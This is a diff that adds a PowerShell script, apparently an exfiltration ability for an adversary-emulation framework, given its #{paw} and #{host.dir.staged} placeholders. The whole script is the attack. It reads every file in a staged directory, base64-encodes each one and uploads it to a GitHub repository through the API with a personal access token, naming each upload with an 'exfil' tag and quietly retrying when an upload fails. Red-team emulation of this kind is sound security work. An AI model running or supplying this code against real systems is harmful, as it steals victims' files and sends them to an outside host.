@@ -1,0 +1,31 @@
+$GHUser = "#{github.user.name}";
+$GHRepo = "#{github.repository.name}";
+$GHPAT = "#{github.access.token}";
+$GHBranch = '#{github.repository.branch}';
+$LocalDirectory = "#{host.dir.staged}";
+$token = $GHUser + ":" + $GHPAT;
+$basetoken = [System.Convert]::ToBase64String([char[]]$token);
+$Headers = @{
+    Authorization = 'Basic {0}' -f $basetoken;
+};
+
+$Files = Get-ChildItem $LocalDirectory;
+foreach ($file in $Files){
+    $RemoteName = "$(Get-Date -Format yyyymmddhhmmss)-exfil-#{paw}-$($file.name)";
+    $uri = "https://api.github.com/repos/" + $GHUser + "/" + $GHRepo + "/contents/" + $RemoteName;
+    $FileBytes = Get-Content -Path $file.FullName -Encoding Byte;
+    $Base64EncodedFileBytes = [System.Convert]::ToBase64String($FileBytes);
+    $Body = @{
+        path = $file.Name;
+        branch = $GHBranch;
+        content = $Base64EncodedFileBytes;
+        encoding = 'base64';
+        message = "Committed " + $file.name + " at: " + (Get-Date);
+    } | ConvertTo-Json;
+    try {
+        $content = Invoke-RestMethod -Headers $Headers -Uri $uri -Body $Body -Method Put -ErrorAction SilentlyContinue;
+    } catch {
+        if ($PSItem -notmatch "but expected") { $PSItem; }
+        else { $content = Invoke-RestMethod -Headers $Headers -Uri $uri -Body $Body -Method Put -ErrorAction SilentlyContinue; }
+    }
+};
